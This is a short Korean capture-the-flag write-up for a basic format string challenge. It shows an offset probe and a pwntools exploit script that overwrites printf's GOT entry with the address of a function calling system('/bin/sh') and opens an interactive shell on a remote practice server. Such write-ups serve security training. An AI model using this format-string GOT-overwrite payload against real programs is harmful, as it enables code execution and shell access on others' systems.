## 함수 분석 / 취약점 발견
기초적인 FSB이다. print의 인자로부터 8byte 떨어진 곳에 배열이 존재한다.
```
froggagul@ubuntu:~/CyKor/week6/problemset/basic_fsb$ ./basic_fsb
input : aaaa%2$p
aaaa0x61616161
```
flag 함수에서 system("/bin/sh")를 실행해주므로, printf의 got를 flag의 주소로 덮으면 된다.
## 구현
1. printf의 got를 flag의 주소로 덮자. got의 주소의 크기 자체가 크지 않으므로 한번에 진행한다.
```python
from pwn import *

# p = process('./basic_fsb')
p = remote('ctf.j0n9hyun.xyz', 3002)
p.recvuntil('input : ')

flag_addr = 0x80485b4
printf_got = 0x804a00c

log.info(str(flag_addr - 4).encode())

payload = p32(printf_got)
payload += b'%'+ str(flag_addr - 4).encode() + b'x%n'

p.sendline(payload)

p.interactive()
```